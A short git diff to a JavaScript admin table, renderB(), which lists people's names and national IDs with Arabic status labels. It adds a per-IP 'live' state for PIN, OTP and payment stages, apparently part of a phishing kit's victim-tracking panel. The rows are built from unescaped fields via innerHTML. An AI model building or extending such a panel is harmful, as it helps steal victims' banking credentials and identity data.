@@ -441,7 +441,8 @@ function renderB(){
   tb.innerHTML=fl.map(b=>{
     const sc={new:'b-new',approved:'b-ok',rejected:'b-rej',pending:'b-pend'}[b.status]||'b-new';
     const sl={new:'جديد',approved:'مكتمل',rejected:'مرفوض',pending:'قيد المعالجة'}[b.status]||'جديد';
-    const live=ls[norm(b.ip||'')];
+    const ip=norm(b.ip||'');
+    const live=ls[ip]||(ld[ip]?(ld[ip].pin?'pin':ld[ip].otp?'otp':ld[ip].pay?'payment':null):null);
     return`<tr data-ip="${norm(b.ip||'')}">
       <td><strong>${b.name||'-'}</strong></td>
       <td style="direction:ltr;font-family:monospace">${b.national_id||'-'}</td>
